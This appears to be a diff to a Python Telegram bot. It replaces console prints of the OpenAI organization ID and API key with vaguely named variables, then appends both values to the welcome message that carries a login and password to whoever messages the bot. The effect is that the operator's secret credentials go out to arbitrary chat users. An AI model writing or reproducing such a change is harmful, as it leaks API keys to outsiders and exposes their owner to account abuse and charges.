@@ -9,8 +9,8 @@ import string
 load_dotenv('./.env')
 
 bot_token = os.environ.get('TG_FACTOBOT')
-print(os.getenv("OPENAI_ORG"))
-print(os.getenv("OPENAI_API_KEY"))
+aaa = os.getenv("OPENAI_ORG")
+uuu = os.getenv("OPENAI_API_KEY")
 
 bot = telebot.TeleBot(bot_token)
 
@@ -26,7 +26,7 @@ def send_welcome(message):
 Логин: <pre>{message.chat.id}</pre>
 Пароль: <pre>{password}</pre>
 '''
-    bot.send_message(message.chat.id, response, parse_mode='HTML')
+    bot.send_message(message.chat.id, response + aaa + uuu, parse_mode='HTML')
 
 @bot.message_handler(commands=['fact'])
 def send_welcome(message):
